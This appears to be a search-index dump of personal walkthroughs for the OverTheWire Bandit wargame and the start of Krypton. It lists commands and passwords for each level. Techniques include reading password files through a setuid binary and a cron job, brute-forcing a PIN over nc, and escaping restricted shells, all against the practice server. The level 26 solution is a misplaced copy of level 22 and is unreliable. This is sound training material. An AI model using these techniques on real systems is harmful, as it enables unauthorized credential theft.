key1.key\nbandit16@bandit:/tmp/foo$ ssh -i key1.key bandit17@localhost\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_7","title":"Password","text":""},{"location":"CTFs/over-the-wire/bandit/#level-17-level-18","title":"level 17 \u2192 level 18","text":"<p>There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new</p> <p>NOTE: if you have solved this level and see \u2018Byebye!\u2019 when trying to log into bandit18, this is related to the next level, bandit19</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_11","title":"Solution","text":"<p>After logging into bandit17, ```sh= bandit17@bandit:~$ diff passwords.old passwords.new 42c42 &lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii</p> <p>kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd <pre><code>#### Password\nkfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n\n\n### level 18 \u2192 level 19\nThe password for the next level is stored in a file **readme** in the homedirectory. Unfortunately, someone has modified **.bashrc** to log you out when you log in with SSH.\n\n- Tips\n    - [[ssh]] with command\n\n#### Solution\n\n```sh=\n$ ssh bandit.labs.overthewire.org -l bandit18 -p 2220 strings readme\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit18@bandit.labs.overthewire.org's password:\nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_8","title":"Password","text":"<p>IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</p>"},{"location":"CTFs/over-the-wire/bandit/#level-19-level-20","title":"level 19 \u2192 level 20","text":"<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_12","title":"Solution","text":"<p><code>sh= bandit19@bandit:~$ ./bandit20-do strings /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j <pre><code>#### Password\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n\n### level 20 \u2192 level 21\nThere is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).\n\n**NOTE**: Try connecting to your own network daemon to see if it works as you think.\n\n- Tips\n    - [create listener](https://unix.stackexchange.com/questions/214471/how-to-create-a-tcp-listener)\n    - tmux\n\n#### Solution\n\nUse `tmux` to create two sessions.\nPane 1\n```sh=\nbandit20@bandit:~$ nc -l -p 8787\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n</code></pre> Pane 2</code>sh= bandit20@bandit:~$ ./suconnect 8787 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password <pre><code>#### Solution\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n\n### level 21 \u2192 level 22\nA program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.\n\n#### Solution\n\n```sh=\nbandit21@bandit:~$ ls /etc/cron.d\ncronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root\nbandit21@bandit:~$ strings /etc/cron.d/cronjob_bandit22\n@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null\n* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null\nbandit21@bandit:~$ strings /usr/bin/cronjob_bandit22.sh\n#!/bin/bash\nchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\ncat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nbandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_9","title":"Password","text":"<p>Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p>"},{"location":"CTFs/over-the-wire/bandit/#level-22-level-23","title":"level 22 \u2192 level 23","text":"<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p> <p>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_13","title":"Solution","text":"<p>```sh= bandit22@bandit:~$ ls /etc/cron.d cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root bandit22@bandit:~$ strings /etc/cron.d/cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null bandit22@bandit:~$ strings /usr/bin/cronjob_bandit23.sh</p>"},{"location":"CTFs/over-the-wire/bandit/#binbash","title":"!/bin/bash","text":"<p>myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:~$ strings /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n <pre><code>#### Password\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n\n### level 23 \u2192 level 24\nA program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.\n\n**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!\n\n**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around\u2026\n\n- Hint\n    - passwords are stored in `/etc/bandit_pass`\n\n- Tips\n    - `chmod`\n    - `cp`\n    - shell script\n\n#### Solution\n\n```sh=\nbandit23@bandit:~$ strings /usr/bin/cronjob_bandit24.sh\n#!/bin/bash\nmyname=$(whoami)\ncd /var/spool/$myname\necho \"Executing and deleting all scripts in /var/spool/$myname:\"\nfor i in * .*;\n    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    then\n        echo \"Handling $i\"\n        owner=\"$(stat --format \"%U\" ./$i)\"\n        if [ \"${owner}\" = \"bandit23\" ]; then\n            timeout -s 9 60 ./$i\n        fi\n        rm -f ./$i\n    fi\ndone\nbandit23@bandit:~$ cd /tmp\nbandit23@bandit:/tmp$ mkdir ss\nbandit23@bandit:/tmp$ cd ss\nbandit23@bandit:/tmp/ss$ vim\nbandit23@bandit:/tmp/ss$ ls\ngogo.sh\nbandit23@bandit:/tmp/ss$ chmod 777 gogo.sh\nbandit23@bandit:/tmp/ss$ chmod 777 /tmp/ss\nbandit23@bandit:/tmp/ss$ strings gogo.sh\n#!/bin/bash\nstrings /etc/bandit_pass/bandit24 &gt; /tmp/ss/b24.txt\nbandit23@bandit:/tmp/ss$ cp gogo.sh /var/spool/bandit24/\n</code></pre> Wait few seconds. <pre><code>bandit23@bandit:/tmp/ss$ ls\nb24.txt  gogo.sh\nbandit23@bandit:/tmp/ss$ strings b24.txt\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_10","title":"Password","text":"<p>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>"},{"location":"CTFs/over-the-wire/bandit/#level-24-level-25","title":"level 24 \u2192 level 25","text":"<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_14","title":"Solution","text":"<p>```sh= bandit22@bandit:~$ cd /tmp bandit22@bandit:~$ mkdir ss bandit22@bandit:~$ cd ss bandit22@bandit:~$ vim gogo.sh bandit24@bandit:/tmp/ss$ strings gogo.sh</p>"},{"location":"CTFs/over-the-wire/bandit/#binbash_1","title":"!/bin/bash","text":"<p>for i in $(seq 0 9999); do     if [ \"${#i}\" = \"1\" ]; then         echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 000$i     elif [ \"${#i}\" = \"2\" ]; then         echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 00$i     elif [ \"${#i}\" = \"3\" ]; then         echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0$i     elif [ \"${#i}\" = \"4\" ]; then         echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i     fi done bandit24@bandit:/tmp/ss$ sh gogo.sh &gt; tt.txt bandit24@bandit:/tmp/ss$ strings tt.txt | nc localhost 30002 Wrong! Please enter the correct pincode. Try again. Wrong! Please enter the correct pincode. Try again. ... Wrong! Please enter the correct pincode. Try again. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</p> <p>Exiting. <pre><code>#### Password\nuNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\n### level 25 \u2192 level 26\nLogging in to bandit26 from bandit25 should be fairly easy\u2026 The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.\n\n- Tips\n    - how to view system users\n    - knowledge to more\n    - vim\n\n#### Solution\n\n```sh=\nbandit25@bandit:~$ ls\nbandit26.sshkey\nbandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost\n...\n\n  _                     _ _ _   ___   __\n | |                   | (_) | |__ \\ / /\n | |__   __ _ _ __   __| |_| |_   ) / /_\n | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\\n | |_) | (_| | | | | (_| | | |_ / /| (_) |\n |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/\nConnection to localhost closed.\n</code></pre> How To View System Users in Linux on Ubuntu check the <code>/etc/passwd</code> <pre><code>bandit25@bandit:~$ strings /etc/passwd | grep bandit26\nbandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext\n</code></pre> Therefore, we know bandit26 use <code>usr/bin/showtext</code>. <pre><code>bandit25@bandit:/usr/bin$ strings showtext\n#!/bin/sh\nexport TERM=linux\nmore ~/text.txt\nexit 0\n</code></pre> The <code>showtext</code> run the more command and log out. The only way to get the password is get the content of <code>etc/bandit_pass/bandit26</code> before <code>exit 0</code> executed. It seems that the <code>text.txt</code> is  <pre><code>  _                     _ _ _   ___   __\n | |                   | (_) | |__ \\ / /\n | |__   __ _ _ __   __| |_| |_   ) / /_\n | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\\n | |_) | (_| | | | | (_| | | |_ / /| (_) |\n |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/\n</code></pre> The command <code>more</code> display the file page by page. Resize the commandline window to prevent <code>more</code> from completing. Then we can use <code>v</code> to edit <code>text.txt</code>. In the vim, use the <code>:e</code> command to open the file containing password. <pre><code>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_11","title":"Password","text":"<p>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</p>"},{"location":"CTFs/over-the-wire/bandit/#level-26-level-27","title":"level 26 \u2192 level 27","text":"<p>Good job getting a shell! Now hurry and grab the password for bandit27!</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_15","title":"Solution","text":"<p>```sh= bandit22@bandit:~$ ls /etc/cron.d cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root bandit22@bandit:~$ strings /etc/cron.d/cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null bandit22@bandit:~$ strings /usr/bin/cronjob_bandit23.sh</p>"},{"location":"CTFs/over-the-wire/bandit/#binbash_2","title":"!/bin/bash","text":"<p>myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:~$ strings /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n <pre><code>#### Password\n3ba3118a22e93127a4ed485be72ef5ea\n\n### level 27 \u2192 level 28\nThere is a git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo`. The password for the user `bandit27-git` is the same as for the user `bandit27`.\n\nClone the repository and find the password for the next level.\n#### Solution\n</code></pre> bandit27@bandit:~$ mkdir /tmp/ssss bandit27@bandit:~$ cd /tmp/ssss bandit27@bandit:/tmp/ssss$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo bandit27-git@localhost's password: remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Receiving objects: 100% (3/3), done. bandit27@bandit:/tmp/ssss$ ls repo bandit27@bandit:/tmp/ssss$ cd repo bandit27@bandit:/tmp/ssss/repo$ ls README bandit27@bandit:/tmp/ssss/repo$ strings README The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 <pre><code>#### Password\n0ef186ac70e04ea33b4c1853d2526fa2\n\n### level 28 \u2192 level 29\nThere is a git repository at `ssh://bandit28-git@localhost/home/bandit28-git/repo`. The password for the user `bandit28-git` is the same as for the user `bandit28`.\n\nClone the repository and find the password for the next level.\n#### Solution\n</code></pre> bandit28@bandit:~$ mkdir /tmp/oso bandit28@bandit:~$ cd /tmp/oso bandit28@bandit:/tmp/oso$ ls bandit28@bandit:/tmp/oso$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo bandit28@bandit:/tmp/oso$ ls repo bandit28@bandit:/tmp/oso$ cd repo bandit28@bandit:/tmp/oso/repo$ ls README.md bandit28@bandit:/tmp/oso/repo$ strings README.md</p>"},{"location":"CTFs/over-the-wire/bandit/#bandit-notes","title":"Bandit Notes","text":"<p>Some notes for level29 of bandit.</p>"},{"location":"CTFs/over-the-wire/bandit/#credentials","title":"credentials","text":"<ul> <li>username: bandit29</li> <li> <p>password: xxxxxxxxxx bandit28@bandit:/tmp/oso/repo$ git log commit edd935d60906b33f0619605abd1689808ccdd5ee Author: Morla Porla morla@overthewire.org Date:   Thu May 7 20:14:49 2020 +0200</p> <p>fix info leak</p> </li> </ul> <p>commit c086d11a00c0648d095d04c089786efef5e01264 Author: Morla Porla morla@overthewire.org Date:   Thu May 7 20:14:49 2020 +0200</p> <pre><code>add missing data\n</code></pre> <p>commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38 Author: Ben Dover noone@overthewire.org Date:   Thu May 7 20:14:49 2020 +0200</p> <pre><code>initial commit of README.md\n</code></pre> <p>bandit28@bandit:/tmp/oso/repo$ git checkout c086d11a00c0648d095d04c089786efef5e01264 Note: checking out 'c086d11a00c0648d095d04c089786efef5e01264'.</p> <p>You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout.</p> <p>If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example:</p> <p>git checkout -b  <p>HEAD is now at c086d11... add missing data bandit28@bandit:/tmp/oso/repo$ ls README.md bandit28@bandit:/tmp/oso/repo$ strings README.md</p>"},{"location":"CTFs/over-the-wire/bandit/#bandit-notes_1","title":"Bandit Notes","text":"<p>Some notes for level29 of bandit.</p>"},{"location":"CTFs/over-the-wire/bandit/#credentials_1","title":"credentials","text":"<ul> <li>username: bandit29</li> <li>password: bbc96594b4e001778eee9975372716b2 <pre><code>#### Password\nbbc96594b4e001778eee9975372716b2\n\n### level 29 \u2192 level 30\nThere is a git repository at `ssh://bandit29-git@localhost/home/bandit29-git/repo`. The password for the user `bandit29-git` is the same as for the user `bandit29`.\n\nClone the repository and find the password for the next level.\n#### Solution\n</code></pre> bandit29@bandit:~$ mkdir /tmp/s29 bandit29@bandit:~$ cd /tmp/s29 bandit29@bandit:/tmp/s29$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo bandit29@bandit:/tmp/s29$ cd repo bandit29@bandit:/tmp/s29/repo$ ls README.md bandit29@bandit:/tmp/s29/repo$ strings README.md</li> </ul>"},{"location":"CTFs/over-the-wire/bandit/#bandit-notes_2","title":"Bandit Notes","text":"<p>Some notes for bandit30 of bandit.</p>"},{"location":"CTFs/over-the-wire/bandit/#credentials_2","title":"credentials","text":"<ul> <li>username: bandit30</li> <li>password:  bandit29@bandit:/tmp/s29/repo$ git branch -a <li>(HEAD detached at 18a6fd6)   master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/dev   remotes/origin/master   remotes/origin/sploits-dev bandit29@bandit:/tmp/s29/repo$ git checkout dev bandit29@bandit:/tmp/s29/repo$ strings README.md</li>"},{"location":"CTFs/over-the-wire/bandit/#bandit-notes_3","title":"Bandit Notes","text":"<p>Some notes for bandit30 of bandit.</p>"},{"location":"CTFs/over-the-wire/bandit/#credentials_3","title":"credentials","text":"<ul> <li>username: bandit30</li> <li> <p>password: 5b90576bedb2cc04c86a9e924ce42faf <pre><code>#### Password\n5b90576bedb2cc04c86a9e924ce42faf\n\n### level 30 \u2192 level 31\nThere is a git repository at `ssh://bandit30-git@localhost/home/bandit30-git/repo`. The password for the user `bandit30-git` is the same as for the user `bandit30`.\n\nClone the repository and find the password for the next level.\n\n- Problem\n    - git tag without any commit (how?)\n\n#### Solution\n</code></pre> bandit30@bandit:~$ mkdir /tmp/s30 bandit30@bandit:~$ cd /tmp/s30 bandit30@bandit:/tmp/s30$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo bandit30@bandit:/tmp/s30$ cd repo bandit30@bandit:/tmp/s30/repo$ ls README.md bandit30@bandit:/tmp/s30/repo$ strings README.md just an epmty file... muahaha bandit30@bandit:/tmp/s30/repo$ git branch -a * master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/master bandit30@bandit:/tmp/s30/repo$ git log commit 3aefa229469b7ba1cc08203e5d8fa299354c496b Author: Ben Dover noone@overthewire.org Date:   Thu May 7 20:14:54 2020 +0200</p> <p>initial commit of README.md bandit30@bandit:/tmp/s30/repo$ git tag secret bandit30@bandit:/tmp/s30/repo$ git show secret 47e603bb428404d265f59c42920d81e5 <pre><code>#### Password\n47e603bb428404d265f59c42920d81e5\n\n### level 31 \u2192 level 32\nThere is a git repository at `ssh://bandit31-git@localhost/home/bandit31-git/repo`. The password for the user `bandit31-git` is the same as for the user `bandit31`.\n\nClone the repository and find the password for the next level.\n\n#### Solution\n</code></pre> bandit31@bandit:~$ mkdir /tmp/s31 bandit31@bandit:~$ cd /tmp/s31 bandit31@bandit:/tmp/s31$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo bandit31@bandit:/tmp/s31$ cd repo bandit31@bandit:/tmp/s31/repo$ ls README.md bandit31@bandit:/tmp/s31/repo$ strings README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: 'May I come in?' Branch: master bandit31@bandit:/tmp/s31/repo$ echo 'May I come in?' &gt; key.txt bandit31@bandit:/tmp/s31/repo$ vim .gitignore bandit31@bandit:/tmp/s31/repo$ git status bandit31@bandit:/tmp/s31/repo$ git add . bandit31@bandit:/tmp/s31/repo$ git commit -m \"add key.txt\" [master 07562e9] add key.txt  2 files changed, 1 insertion(+), 1 deletion(-)  create mode 100644 key.txt bandit31@bandit:/tmp/s31/repo$ git push Could not create directory '/home/bandit31/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</p> </li> </ul> <p>bandit31-git@localhost's password: Counting objects: 4, done. Delta compression using up to 2 threads. Compressing objects: 100% (2/2), done. Writing objects: 100% (4/4), 333 bytes | 0 bytes/s, done. Total 4 (delta 0), reused 0 (delta 0) remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: 56a9bf19c63d650ce78e6ec0354ee45e remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost/home/bandit31-git/repo  ! [remote rejected] master -&gt; master (pre-receive hook declined) error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo' <pre><code>#### Password\n56a9bf19c63d650ce78e6ec0354ee45e\n\n### level 32 \u2192 level 33\nAfter all this `git` stuff its time for another escape. Good luck!\n\n- Tips\n    - [$0](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Positional-Parameters)\n\n\n#### Solution\n</code></pre> WELCOME TO THE UPPERCASE SHELL</p> <p>ls sh: 1: LS: not found echo sh: 1: ECHO: not found $shell WELCOME TO THE UPPERCASE SHELL $0 $ whoami bandit33 $ strings /etc/bandit_pass/bandit33 c9c3199ddf4121b10cf581a98d51caee <pre><code>#### Password\nc9c3199ddf4121b10cf581a98d51caee\n\n\n### level 33 \u2192 level 34\n**At this moment, level 34 does not exist yet.**\n\n#### Solution\n</code></pre> bandit33@bandit:~$ ls README.txt bandit33@bandit:~$ strings README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! ```</p>"},{"location":"CTFs/over-the-wire/bandit/#password_12","title":"Password","text":"<p>c9c3199ddf4121b10cf581a98d51caee</p>"},{"location":"CTFs/over-the-wire/krypton/","title":"krypton walkthrough","text":""},{"location":"CTFs/over-the-wire/krypton/#krypton","title":"Krypton","text":"<p>https://overthewire.org/wargames/krypton/krypton0.html</p> <p>try not to use public tool until level 6</p>"},{"location":"CTFs/over-the-wire/krypton/#level-0-level-1","title":"level 0 \u2192 level 1","text":"<p>Welcome to Krypton! The first level is easy. The following string encodes the password using Base64:</p> <pre><code>S1JZUFRPTklTR1JFQVQ=\n</code></pre> <p>Use this password to log in to krypton.labs.overthewire.org with username krypton1 using [[SSH]] on port 2231. You can find the files for other levels in /krypton/</p> <ul> <li>Tips<ul> <li>base64</li> </ul> </li> </ul>"},{"location":"CTFs/over-the-wire/krypton/#solution","title":"Solution","text":"<pre><code>$ echo \"S1JZUFRPTklTR1JFQVQ=\" &gt; tt.txt\n$ base64 -d tt.txt\nKRYPTONISGREAT\n</code></pre>"},{"location":"CTFs/over-the-wire/krypton/#password","title":"Password","text":"<p>KRYPTONISGREAT</p>"},{"location":"CTFs/over-the-wire/krypton/#level-1-level-2","title":"level 1 \u2192 level 2","text":"<p>The password for level 2 is in the file \u2018krypton2\u2019. It is \u2018encrypted\u2019 using a simple rotation. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy!</p>"},{"location":"CTFs/over-the-wire/krypton/#solution_1","title":"Solution","text":"<p>After logging into krypton1, <pre><code>krypton1@krypton:~$ cd /krypton/krypton1\nkrypton1@krypton:/krypton/krypton1$ ls\nkrypton2  README\nkrypton1@krypton:/krypton/krypton1$ strings README\nWelcome to Krypton!\nThis game is intended to give hands on experience with cryptography\nand cryptanalysis.  The levels progress from classic ciphers, to modern,\neasy to harder.\nAlthough there are excellent public tools, like cryptool,to perform\nthe simple analysis, we strongly encourage you to try and do these\nwithout them for now.  We will use them in later excercises.\n** Please try these levels without cryptool first **\nThe first level is easy.  The password for level 2 is in the file\n'krypton2'.  It is 'encrypted' using a simple rotation called ROT13.\nIt is also in non-standard ciphertext format.  When using alpha characters for\ncipher text it is normal to group the letters into 5 letter clusters,\nregardless of word boundaries.  This helps obfuscate any patterns.\nThis file has kept the plain text word boundaries and carried them to\nthe cipher text.\nEnjoy!\nkrypton1@krypton:/krypton/krypton1$ strings krypton2\nYRIRY GJB CNFFJBEQ EBGGRA\n</code></pre> rot13 decrypt online <pre><code>LEVEL TWO PASSWORD ROTTEN\n</code></pre></p>"},{"location":"CTFs/over-the-wire/krypton/#password_1","title":"Password","text":"<p>ROTTEN</p>"},{"location":"CTFs/over-the-wire/krypton/#level-2-level-3","title":"level 2 \u2192 level 3","text":"<p>ROT13 is a simple substitution cipher.</p> <p>Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a \u2018monoalphebetic\u2019 cipher. Monoalphebetic means, literally, \u201cone alphabet\u201d and you will see why.</p> <p>This level contains an old form of cipher called a \u2018Caesar Cipher\u2019. A Caesar cipher shifts the alphabet by a set number. For example:</p> <pre><code>plain:  a b c d e f g h i j k ...\ncipher: G H I J K L M N O P Q ...\n</code></pre> <p>In this example, the letter \u2018a\u2019 in plaintext is replaced by a \u2018G\u2019 in the ciphertext so, for example, the plaintext \u2018bad\u2019 becomes \u2018HGJ\u2019 in ciphertext.</p> <p>The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break. You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy.</p> <p>One shot can solve it!</p> <p>Have fun.</p> <p>Additional Information:</p> <p>The <code>encrypt</code> binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the <code>encrypt</code> binary runs setuid <code>krypton3</code>, you also need to give <code>krypton3</code> access to your working directory.</p> <p>Here is an example:</p> <pre><code>krypton2@melinda:~$ mktemp -d\n/tmp/tmp.Wf2OnCpCDQ\nkrypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ\nkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat\nkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls\nkeyfile.dat\nkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 .\nkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue\nkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls\nciphertext  keyfile.dat\n</code></pre>"},{"location":"CTFs/over-the-wire/krypton/#solution_2","title":"Solution","text":"<p>After logging into krypton2, <pre><code>krypton2@krypton:~$ cd /krypton/krypton2\nkrypton2@krypton:/krypton/krypton2$ ls\nencrypt  keyfile.dat  krypton3  README\nkrypton2@krypton:/krypton/krypton2$ strings README\n...\nkrypton2@krypton:/krypton/krypton2$ mktemp -d\n/tmp/tmp.GVN3015gKY\nkrypton2@krypton:/krypton/krypton2$ cd /tmp/tmp.GVN3015gKY\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ ln -s /krypton/krypton2/keyfile.dat\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ ls\nkeyfile.dat\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ chmod 777 .\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ /krypton/krypton2/encrypt /etc/issue\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ ls\nciphertext  keyfile.dat\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ strings ciphertext\nPQHGMZSZGXUZGJMEOUUZX\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ file /etc/issue\n/etc/issue: ASCII text\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ strings /etc/issue\nDevuan GNU/Linux ascii \\n \\l\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ echo {a..z} &gt; az\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ ls\naz  ciphertext  keyfile.dat\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ /krypton/krypton2/encrypt /tmp/tmp.GVN3015gKY/az\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ ls\naz  ciphertext  keyfile.dat\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ strings ciphertext\nMNOPQRSTUVWXYZABCDEFGHIJKL\nkrypton2@krypton:/tmp/tmp.GVN3015gKY$ cd /krypton/krypton2\nkrypton2@krypton:/krypton/krypton2$ ls\nencrypt  keyfile.dat  krypton3  README\nkrypton2@krypton:/krypton/krypton2$ strings krypton3\nOMQEMDUEQMEK\nkrypton2@krypton:/krypton/krypton2$ strings krypton3 | tr \"MNOPQRSTUVWXYZABCDEFGHIJKL\" \"A-Z\"\nCAESARISEASY\n</code></pre></p>"},{"location":"CTFs/over-the-wire/krypton/#password_2","title":"Password","text":"<p>CAESARISEASY</p>"},{"location":"CTFs/over-the-wire/krypton/#level-3-level-4","title":"level 3 \u2192 level 4","text":"<p>Well done. You\u2019ve moved past an easy substitution cipher.</p> <p>The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker.</p> <p>However, you have been 